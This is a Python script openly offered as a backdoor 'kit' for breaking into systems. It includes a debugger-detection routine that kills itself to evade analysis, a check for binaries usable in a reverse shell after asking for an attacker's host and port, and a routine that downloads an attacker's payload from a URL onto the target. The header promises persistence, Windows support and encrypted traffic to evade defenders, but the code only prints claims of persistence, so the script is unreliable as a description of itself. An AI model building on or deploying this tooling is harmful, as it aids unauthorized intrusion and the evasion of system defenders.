#!/usr/bin/python3
# Author -> NullByte
# Welcome to your kit to break systems, yes break systems, do not like to talk "tool". What does it do? well allows persistence on the target system, windows/linux automatically identifies the operating system running,
# analyzes processes running debugger and thus terminates the backdoor, allows external payload or the backdoor itself so the attacker has more options to use, not only depending on the payload created by the backdoor,
#after that it encrypts the communication in order to avoid discoveries in the network by sysadmin,blue team. in the future I will implement new features, such as porting to golang.


import os
import sys
from urllib.request import urlretrieve
import psutil

def check_system():

    if os.path.exists("/tmp"):
        return "linux"
    elif os.path.exists("C:\\"):
        return "windows"
    else:
         print("[!] UNKNOW SYSTEM!? ALIEN???")
         sys.exit(1)



def check_debugger_linux():

     for proc in psutil.process_iter(['pid','name']):     
            debuggers = {'ghidra','gdb','strace'}
            for debug in debuggers:    
                if debug in proc.info['name'].lower():
                    print("[!] FOUND PROCESS DEBUGGER KILL BACKDOOR")
                    sys.exit(1)



def internal_backdoor_linux():

    print("[!] BACKDOOR IS INTERNAL")
    LHOST = input("[$] SET LHOST => ")
    LPORT = input("[$] SET LPORT => ")

    print(f"[@] YOUR LHOST {LHOST}:{LPORT} IMPLEMENTED PERSISTENCE...")
    reverse_shell_binary = {'/usr/bin/busybox', '/usr/local/bin/busybox', '/bin/busybox', '/usr/bin/nc', '/usr/local/bin/nc', '/bin/nc', '/usr/bin/ncat', '/usr/local/bin/ncat', '/bin/ncat', '/usr/bin/perl', '/usr/local/bin/perl', '/bin/perl', '/usr/bin/python', '/usr/local/bin/python', '/bin/python', '/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3', '/usr/bin/ruby', '/usr/local/bin/ruby', '/bin/ruby'}
    for reverse in reverse_shell_binary:
        if os.path.exists(reverse):
            print(f"[#] FOUND BINARY TO REVERSE SHELL: {reverse}")


def external_backdoor_linux():

    print("[!] BACKDOOR IS EXTERNAL")
    choice_payload_attacker = input("[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ")
    if "surface" in choice_payload_attacker:
        url_payload = input("[@] URL YOUR PAYLOAD => ")
        url_payload_dest = input("[#] PUT DESTINATION PATH FOR PAYLOAD (example /tmp/) => ")
        url_payload_name = input("[$] NAME YOUR PAYLOAD (example backdoor.sh)  => ")
        url = url_payload
        dst = url_payload_dest + url_payload_name
        urlretrieve(url, dst)
        if os.path.exists(dst):
            print(f"[7w7] Payload Found In -> {dst}")
            print("[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
        else:
            print("[!] Payload Not Found => ")
            sys.exit(1)
    elif "local" in choice_payload_attacker:
        path_payload = input("[#] PATH YOUR PAYLOAD => ")
        access_payload = os.path.exists(path_payload)
        if access_payload:
            print("[1337] IMPLEMENTED PERSITENCE IN  PAYLOAD")
        else:
            print(f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
    else:
        print("[!] ?????? TRY AGAIN -> surface or local")






print(r'''
       
           \`*-.                    
            )  _`-.                 
           .  : `. .                
           : _   '  \               
           ; *` _.   `*-._          
           `-.-'          `-.       
             ;       `       `.     
             :.       .        \    
             . \  .   :   .-'   .   
             '  `+.;  ;  '      :   
             :  '  |    ;       ;-. 
             ; '   : :`-:     _.`* ;
            .*' /  .*' ; .*`- +'  `*' 
            `*-*   `*-*  `*-*'

    H1D3 C4T ||NULLBYTE||
''')

print("-----------------------------------------------")
print("[!] Checking Operating System...")
check_system()
print("[!] Checking Anti-Malware/Debuggers Running...")
check_debugger_linux()
print("-----------------------------------------------")

if "linux" in check_system():
    print("[!] SYSTEM LINUX")
    choice_linux = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
    if "internal" in choice_linux:
        internal_backdoor_linux()
    elif "external" in choice_linux:
        external_backdoor_linux()
    else:
        print("[!] Write internal or external try again! 7w7")
        sys.exit(1)
elif "windows" in check_system():
    print("[!] SYSTEM WINDOWS!")
    choice_windows = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
else:
    print("[!] MACHINE UNKNOW")
    sys.exit(1)
